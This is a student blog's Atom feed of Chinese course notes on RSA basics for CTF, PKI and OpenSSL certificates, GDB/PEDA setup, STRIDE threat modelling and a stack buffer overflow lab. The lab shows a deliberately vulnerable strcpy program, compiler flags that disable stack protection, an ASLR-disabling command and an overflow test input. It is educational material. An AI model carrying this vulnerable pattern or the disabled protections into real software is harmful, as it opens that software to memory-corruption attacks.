<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Manayakko - 微笑才是王道</title>
  
  <subtitle>越努力，越幸运</subtitle>
  <link href="https://manayakko.github.io/yakko117/atom.xml" rel="self"/>
  
  <link href="https://manayakko.github.io/yakko117/"/>
  <updated>2023-08-17T03:30:38.027Z</updated>
  <id>https://manayakko.github.io/yakko117/</id>
  
  <author>
    <name>Manayakko</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF密码学入门学习(二)</title>
    <link href="https://manayakko.github.io/yakko117/2023/08/15/ctf%E5%AF%86%E7%A0%81%E5%AD%A62/"/>
    <id>https://manayakko.github.io/yakko117/2023/08/15/ctf%E5%AF%86%E7%A0%81%E5%AD%A62/</id>
    <published>2023-08-15T06:19:06.926Z</published>
    <updated>2023-08-17T03:30:38.027Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h2><p><a href="https://jeremykun.com/2011/07/30/number-theory-a-primer/">数论基础</a><br><a href="https://www.cnblogs.com/idreamo/p/9411265.html">RSA参考连接</a><br><a href="https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">阮一峰笔记</a><br>基础知识主要是大数取模（网上挺多RSA的讲解分析的</p><p>基于指数加密，使用乘法生成密钥（单向加密）</p><p>明文字符 –&gt; 数字 （明文字符ASCII二进制表示转换成相等的整数）<br>计算除明文整数值的 <code>e次幂</code> 再对 <code>n</code> 取模</p><p>几个tips:</p><ol><li><code>p</code> 和 <code>q</code> 一般大于200位 (<strong>n &#x3D; pq</strong>) </li><li><strong>e</strong> 与 <strong>(p-1)(q-1)</strong> 互为素数 </li><li>通常选择3、17、65、537作为 <strong>e</strong> 的值 （<strong>e</strong> 为公钥的一部分, <strong>d</strong> 为私钥的一部分）</li></ol><ul><li>d &#x3D; $e^{-1}$ mod (p-1)(q-1)</li><li>假设e &#x3D; 17, 当d为多少时可以满足 <code>ed mod (p-1)(q-1) = 1</code> (53, 233, 413, 593, 773, 953)</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>, <span class="number">999</span>):</span><br><span class="line">    b = a*<span class="number">17</span>%<span class="number">180</span></span><br><span class="line">    <span class="keyword">if</span>( b == <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a=&quot;</span>, a)</span><br></pre></td></tr></table></figure></div><ol><li>将(e,n)作为公钥P，将(d,n)作为私钥S</li></ol><ul><li><strong>P &#x3D; (e,n) , S &#x3D; (d,n)</strong></li><li>加密方使用P来加密数据，解密方使用S来解密。<strong>为了防止就算有人知道了P也无法推算出S，必须保证p和q的值绝对不能暴露。</strong></li></ul><h2 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h2>]]></content>
    
    
    <summary type="html">主要记录最近上课学的东西</summary>
    
    
    
    <category term="做题笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
    <category term="密码学" scheme="https://manayakko.github.io/yakko117/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Monash Courses 2023S2 FIT5037</title>
    <link href="https://manayakko.github.io/yakko117/2023/07/25/MonashCs5037/"/>
    <id>https://manayakko.github.io/yakko117/2023/07/25/MonashCs5037/</id>
    <published>2023-07-25T05:59:35.317Z</published>
    <updated>2023-08-03T05:51:08.107Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><p>扯皮<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202307251440615.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202307251440615.jpg" class="lazyload"></a></p><p>week5 test week1-4 </p><p>lecture 讲的点都挺好，但是就提了一嘴 不太行</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><p><a href="https://distroid.net/install-gns3-kali-linux/">安装GNS3</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y python3-pip python3-pyqt5 python3-pyqt5.qtsvg python3-pyqt5.qtwebsockets</span><br><span class="line"></span><br><span class="line">sudo apt install qemu-system-x86</span><br><span class="line"></span><br><span class="line">pip install gns3-server gns3-gui</span><br><span class="line"></span><br><span class="line">sudo reboot</span><br><span class="line"></span><br><span class="line">gns3</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202307271235954.jpg" data-fancybox="group" data-caption="GNS3" class="fancybox"><img alt="GNS3" title="GNS3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202307271235954.jpg" class="lazyload"></a></p><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><p>Lecture PKI 内容<br><code>PKI</code> consists of all pieces needed to securely use public key cryptography</p><ul><li>Key generation and management</li><li>Certification authorities, digital certificates</li><li>Certificate revocation lists (CRL) 吊销列表</li></ul><h2 id="Get-Paypal’s-certificates-via-openssl"><a href="#Get-Paypal’s-certificates-via-openssl" class="headerlink" title="Get Paypal’s certificates via openssl"></a>Get Paypal’s certificates via openssl</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -showcerts -connect www.paypal.com:443 &lt;/dev/null</span><br></pre></td></tr></table></figure></div><p>回显存在2段证书 </p><ol><li><strong>服务器证书链(Server Certificate Chain)</strong>:<br>这是来自服务器的 SSL&#x2F;TLS 证书链。在你的输出中，这段证书链是关于”<a href="http://www.paypal.com" 的，它包含以下信息：">www.paypal.com&quot;的，它包含以下信息：</a></li></ol><ul><li>Subject: “<a href="http://www.paypal.com" 的主题信息,包括该域名的组织信息、所在地区等. ">www.paypal.com&quot;的主题信息，包括该域名的组织信息、所在地区等。</a></li><li>Issuer: 证书的颁发者，也就是签发该服务器证书的机构，这里是”DigiCert SHA2 Extended Validation Server CA”。</li><li>Public Key: 服务器的公钥，用于加密和验证通信数据。</li><li>Validity Period: 证书的有效期。<br>服务器证书链中的最后一个证书（Subject为”<a href="http://www.paypal.com" )是服务器的真实证书,客户端会验证该证书以确保连接到正确的服务器,而不是受到中间人攻击. ">www.paypal.com&quot;）是服务器的真实证书，客户端会验证该证书以确保连接到正确的服务器，而不是受到中间人攻击。</a></li></ul><ol start="2"><li><strong>中间证书链(Intermediate Certificate Chain)</strong>:<br>该部分包含了用于验证服务器证书的中间证书。在TLS&#x2F;SSL通信中，服务器不仅需要提供其真实证书，还需要提供完整的证书链，以便客户端能够验证其有效性。客户端的SSL库可能不直接信任服务器证书颁发者（DigiCert SHA2 Extended Validation Server CA），但可以验证其证书是否由已知和信任的中间证书颁发者签发。</li></ol><p>在输出中，中间证书链中只有一个中间证书，它是 “DigiCert SHA2 Extended Validation Server CA”。这个中间证书由DigiCert颁发，同时也颁发了服务器证书。通过提供中间证书链，服务器确保客户端能够验证服务器证书的有效性，因为客户端的SSL库可以追溯到信任的根证书颁发者（在这里是”DigiCert High Assurance EV Root CA”）。</p><p>通过将服务器证书和中间证书链一起提供，服务器可以确保客户端在建立安全连接时能够正确验证服务器的身份。这是TLS&#x2F;SSL通信中的一个重要步骤，确保通信的安全性和完整性。</p><h2 id="CA-setup"><a href="#CA-setup" class="headerlink" title="CA setup"></a>CA setup</h2><h3 id="generates-a-self-signed-X-509-certificate"><a href="#generates-a-self-signed-X-509-certificate" class="headerlink" title="generates a self-signed X.509 certificate"></a>generates a self-signed X.509 certificate</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -sha256 -days 3650</span><br><span class="line">            -keyout testCA_key.pem -out testCA_cert.pem</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308011503608.jpg" data-fancybox="group" data-caption="Cert_test" class="fancybox"><img alt="Cert_test" title="Cert_test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308011503608.jpg" class="lazyload"></a></p><h2 id="Get-a-Certificate-from-CA"><a href="#Get-a-Certificate-from-CA" class="headerlink" title="Get a Certificate from CA"></a>Get a Certificate from CA</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -aes128 -out testCA_key.pem 2048</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">蛤 蛤</summary>
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Monash Cs" scheme="https://manayakko.github.io/yakko117/tags/Monash-Cs/"/>
    
  </entry>
  
  <entry>
    <title>Monash Courses 2023S2 FIT5003</title>
    <link href="https://manayakko.github.io/yakko117/2023/07/11/MonashCs5003/"/>
    <id>https://manayakko.github.io/yakko117/2023/07/11/MonashCs5003/</id>
    <published>2023-07-10T18:20:54.531Z</published>
    <updated>2023-08-22T01:10:32.950Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>md 怎么什么都要学啊<br><a href="https://www.handsonsecurity.net/resources.html">学习网站</a><br><a href="https://www.handsonsecurity.net/files/misc/SEEDBook_figs_2nd.pdf">推荐书籍</a></p><h1 id="Buffer-Overflow-Attack"><a href="#Buffer-Overflow-Attack" class="headerlink" title="Buffer Overflow Attack"></a>Buffer Overflow Attack</h1><p><a href="https://blog.csdn.net/beilizhang/article/details/118696764">C++入门——缓冲区溢出</a><br><a href="https://blog.csdn.net/qq_20254219/article/details/124191975">缓冲区溢出（栈溢出</a><br><a href="https://blog.csdn.net/qq_35642036/article/details/82809845">什么是缓冲区溢出</a><br><a href="https://blog.csdn.net/tan6600/article/details/46754467">缓冲区溢出学习</a></p><p>因为要看shellcode 和做栈溢出测试，所以最近要学一下PWN </p><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="GDB-kali安装失败"><a href="#GDB-kali安装失败" class="headerlink" title="GDB kali安装失败"></a>GDB kali安装失败</h2><p><a href="https://blog.csdn.net/m0_46363249/article/details/109304163">参考链接</a></p><p>更新软件包列表：首先，确保你的软件包列表是最新的。打开终端并输入以下命令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></div><p>清理不完整的安装：如果之前的安装尝试没有成功，可能会导致一些不完整的安装。在终端中运行以下命令，尝试清理可能存在的问题：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt --fix-broken install</span><br></pre></td></tr></table></figure></div><p>清理GDB相关包：如果有旧版本的GDB残留在系统中，尝试删除它们并重新安装GDB：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove gdb</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure></div><p>安装GDB：再次尝试安装GDB：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb</span><br></pre></td></tr></table></figure></div><p>建议<br><strong>检查错误信息</strong></p><p><strong>切换软件源</strong></p><p><strong>确保网络连接正常</strong></p><p><strong>检查系统依赖</strong>：GDB可能有一些依赖关系，确保这些依赖关系已经安装。可以尝试通过以下命令安装GDB的依赖项：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y build-essential</span><br></pre></td></tr></table></figure></div><p><strong>更新系统</strong>：如果Kali Linux系统很久没有更新，尝试更新系统，然后重新尝试安装GDB。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure></div><h2 id="设置-peda"><a href="#设置-peda" class="headerlink" title="设置 peda"></a>设置 peda</h2><ol><li>下载PEDA脚本</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br></pre></td></tr></table></figure></div><ol start="2"><li><p>配置GDB：进入GDB的配置目录（通常为 <code>~/.gdbinit</code> ），如果不存在则创建：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">touch</span> ~/.gdbinit</span><br></pre></td></tr></table></figure></div></li><li><p>向 <code>.gdbinit</code> 添加PEDA配置：使用文本编辑器打开 <code>.gdbinit</code> 文件，并在其中添加以下行：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/peda/peda.py</span><br></pre></td></tr></table></figure></div></li></ol><p>然后重新启动 <code>GDB</code></p><h2 id="gcc-生成的文件-gdb-peda-如何测试"><a href="#gcc-生成的文件-gdb-peda-如何测试" class="headerlink" title="gcc 生成的文件 gdb peda 如何测试"></a>gcc 生成的文件 gdb peda 如何测试</h2><ol><li>编译文件：首先，使用 <code>gcc</code> 编译源代码并生成可执行文件。假设源文件名为 <code>test.c</code>，可以使用以下命令进行编译：<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></div></li></ol><p><code>-g</code> 选项会生成调试信息，以便GDB可以使用。</p><ol start="2"><li><p>启动GDB</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div></li><li><p>设置断点：在 <code>GDB</code> 中设置断点，以便在程序执行到特定位置时停止。最简单的方法是在 <code>main函数</code> 中设置断点。在GDB命令行中输入以下命令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">break</span> main</span><br></pre></td></tr></table></figure></div></li></ol><ul><li><p>运行程序：输入run命令来运行程序。程序将在设置的断点处停止执行。</p></li><li><p>执行调试命令：一旦程序在断点处停止，可以使用PEDA提供的命令以及标准GDB命令来查看和分析程序状态。<br>可以使用peda-patch命令查看函数的汇编代码<br>使用peda-searchmem命令在内存中搜索值<br>使用print命令打印变量的值等等。</p></li><li><p>继续执行：输入continue命令来继续执行程序，直到下一个断点或程序结束。</p></li><li><p>退出GDB：完成调试，输入 <code>quit</code> 命令退出GDB。</p></li></ul><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="Data-Flow-Diagram-DFD"><a href="#Data-Flow-Diagram-DFD" class="headerlink" title="Data Flow Diagram (DFD)"></a>Data Flow Diagram (DFD)</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308010814324.jpg" data-fancybox="group" data-caption="DFD" class="fancybox"><img alt="DFD" title="DFD" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308010814324.jpg" class="lazyload"></a></p><h2 id="Threat-type"><a href="#Threat-type" class="headerlink" title="Threat type"></a>Threat type</h2><ul><li><strong>Spoofing</strong>: Spoofing refers to the act of posing as someone else (i.e., spoofing a user) or claiming a false identity (i.e., spoofing a process).</li><li><strong>Tampering</strong>: Tampering refers to malicious modification of data or processes. Tampering may occur on<br>data in transit, on data at rest, or on processes.</li><li><strong>Repudiation</strong>: Repudiation refers to the ability of denying that an action or an event has occurred.</li><li><strong>Information disclosure</strong>: Information Disclosure refers to data leaks or data breaches. This could occur on data in transit, data at rest, or even to a process.</li><li><strong>Denial of Service</strong>: Denial of Service refers to causing a service or a network resource to be unavailable to its intended users.</li><li><strong>Elevation of privilege</strong>: Elevation of Privileges refers to gaining access that one should not have.</li></ul><table><thead><tr><th>Threat Type</th><th>Security Property</th></tr></thead><tbody><tr><td>Spoofing</td><td>authentication</td></tr><tr><td>Tampering 篡改</td><td>validation of users’ inputs and proper encoding of outputs</td></tr><tr><td>Repudiation 否认</td><td>audit logging</td></tr><tr><td>Information Disclosure</td><td>encryption</td></tr><tr><td>Denial of Service</td><td>log rotation and monitoring&#x2F;alerting when disk is nearing capacity 磁盘接近容量时日志轮转和监控&#x2F;警报</td></tr><tr><td>Elevation of Privilege</td><td>authorization mechanism</td></tr></tbody></table><h3 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080810871.jpg" data-fancybox="group" data-caption="app1" class="fancybox"><img alt="app1" title="app1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080810871.jpg" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080810185.jpg" data-fancybox="group" data-caption="app2" class="fancybox"><img alt="app2" title="app2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080810185.jpg" class="lazyload"></a></p><hr><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><p>主要讲的栈溢出</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_authentication</span><span class="params">(<span class="type">char</span> *password)</span> &#123; <span class="comment">// 接受一个指向字符的指针 password 作为参数</span></span><br><span class="line">    <span class="type">char</span> password_buffer[<span class="number">96</span>]; <span class="comment">// 字符数组，用于存储输入的密码</span></span><br><span class="line">    <span class="type">int</span> auth_flag[<span class="number">1</span>];</span><br><span class="line">    auth_flag[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// 声明了一个长度为 1 的整数数组 auth_flag，用于存储验证标志，初始化为 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存在栈溢出</span></span><br><span class="line">    <span class="built_in">strcpy</span>(password_buffer, password); <span class="comment">// 使用 strcpy 函数将输入的密码复制到 password_buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password_buffer, <span class="string">&quot;brillig&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        auth_flag[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password_buffer, <span class="string">&quot;outgrabe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        auth_flag[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> auth_flag[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(check_authentication(argv[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;      Access Granted.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nAccess Denied.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="Disable-the-Buffer-overflow-countermeasures"><a href="#Disable-the-Buffer-overflow-countermeasures" class="headerlink" title="Disable the Buffer overflow countermeasures"></a>Disable the Buffer overflow countermeasures</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -g -o testBOF testBOF.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># debugger (-g)</span></span><br><span class="line"><span class="comment"># disable stack protector (–fno-stack-protector)</span></span><br><span class="line"><span class="comment"># allow the stack to contain executable code (-z execstack)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径不一定有 这个可以忽略</span></span><br><span class="line">sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space. </span><br></pre></td></tr></table></figure></div><p>后面就是照着课件步骤来就行了 打断点测试<br>(我用的是x64的虚拟机 所以地址和课件不同)</p><p>如果想要用32位 <a href="https://www.cnblogs.com/blackicelisa/p/12432288.html">推荐参考配置</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ list 1,40</span><br><span class="line">...</span><br><span class="line">gdb-peda$ <span class="built_in">break</span> 12</span><br><span class="line">Breakpoint 1 at 0x118c: file test.c, line 12.</span><br><span class="line">gdb-peda$ <span class="built_in">break</span> 19</span><br><span class="line">Breakpoint 2 at 0x11e1: file test.c, line 19.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">gdb-peda$ disass main</span><br></pre></td></tr></table></figure></div><p>看到地址位置<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080933618.jpg" data-fancybox="group" data-caption="w3_gdb" class="fancybox"><img alt="w3_gdb" title="w3_gdb" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080933618.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ run $(perl -e <span class="string">&#x27;print &quot;\x41&quot;x100&#x27;</span>)</span><br><span class="line"><span class="comment"># 根据返回内容可以知道 通过perl语言 将A重复100次 输入到地址</span></span><br><span class="line">...</span><br><span class="line">Breakpoint 1, check_authentication (password=0x7fffffffe1ba <span class="string">&#x27;A&#x27;</span> &lt;repeats 100 <span class="built_in">times</span>&gt;) at test.c:12</span><br><span class="line">12              strcpy(password_buffer, password);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080937891.jpg" data-fancybox="group" data-caption="w3_gdb_2" class="fancybox"><img alt="w3_gdb_2" title="w3_gdb_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308080937891.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这个是x32的地址</span></span><br><span class="line">gdb-peda$ x/48xw password_buffer</span><br></pre></td></tr></table></figure></div><hr><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div 